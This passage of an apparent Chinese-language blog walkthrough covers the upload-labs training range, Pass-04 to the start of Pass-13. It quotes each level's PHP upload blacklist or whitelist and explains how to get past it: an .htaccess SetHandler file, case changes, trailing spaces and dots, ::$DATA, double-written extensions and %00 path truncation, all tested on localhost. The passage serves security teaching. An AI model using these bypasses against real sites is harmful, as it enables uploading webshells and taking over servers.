class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>黑名单几乎过滤掉了所有问题后缀名，但是唯独没有过滤<strong>.htaccess</strong>文件，我们上传一个<strong>.htaccess</strong>文件，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传之后，该路径下所有文件都会被解析成PHP格式文件，我们再上传包含PHP代码的图片文件</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://127.0.0.1/upload-labs/upload/4cmd.jpg" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/upload/4cmd.jpg</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>跟上一关区别的是黑名单又增加了.htaccess文件，过滤代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>但是仔细观察发现这关并没有将上传文件的后缀名通过<strong>strtolower</strong>进行大小写转化的处理，所以很简单，上传一个<strong>.PHP</strong>文件即可</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><p>黑名单一样，并对文件名进行小写转化处理，但是未对文件名通过<strong>trim</strong>函数进行去空处理，所以对后缀名进行加空，即可上传成功</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>黑名单相同，对文件名进行去空和小写转换处理，但是没有通过自定义的<strong>deldot</strong>函数进行末尾去点处理，所以上传后缀名为<strong>.php.</strong>文件，windows特性上传后会自动将后缀名的点去掉</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>这关没有通过str_ireplace函数去除字符串<strong>::$DATA</strong>，在文件名后缀加上<strong>::$DATA</strong>即可绕过</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-9"><a href="#Pass-9" class="headerlink" title="Pass-9"></a>Pass-9</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>相对于前面几关而言，这关过滤的较为完善，可以看到，过滤的流程为：（1）文件名去空（2）文件名去点（3）截取最后一个点后的字符串（4）将截取的文件后缀转换为小写（4）将截取的文件名后缀去除字符串::$DATA（5）将截取的文件名后缀去空</p><p>我们可以看一下deldot函数的具体代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span><span class="params">($s)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>($i = strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">$c = substr($s,$i,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">'.'</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($c != <span class="string">'.'</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，检测流程是从文件名的最后一位开始检测，是点就去掉末位，继续向前检测，只要检测到文件名最后一位不是点，就返回过滤后的文件名，而且去点只有一次</p><p>针对上述过滤流程，我们可以构造后缀名为<strong>.php. .(点+空格+点)</strong>，经过去点过滤后的文件名为<strong>.php. （点+空格）</strong>，之后截取文件名后缀自然就绕过检测，上传的文件名最后后缀为<strong>.php.（点）</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;        </span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关是将上传文件的文件名通过<strong>str_ireplace</strong>函数去除黑名单中的文件后缀，但是这个函数的缺点是只能去除一次，所以双写就能绕过，上传文件名后缀为<strong>.pphphp</strong></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/19.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关开始采用了白名单的形式，要求上传文件名后缀名必须为jpg，png，gif，但是我们可以发现上传文件的路径是通过GET方式传递的参数<strong>save_path</strong>进行拼接的，所以在<strong>save_path</strong>末尾利用<strong>%00</strong>截断绕过</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/21.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/22.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关拼接的参数<strong>save_path</strong>是通过POST方式传递的，同样抓包修改<strong>save_path</strong>，但是因为POST不像GET能URL解码<strong>%00</strong>，所以我们需要在<strong>二进制</strong>中修改</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/23.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/upload-labs/24.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    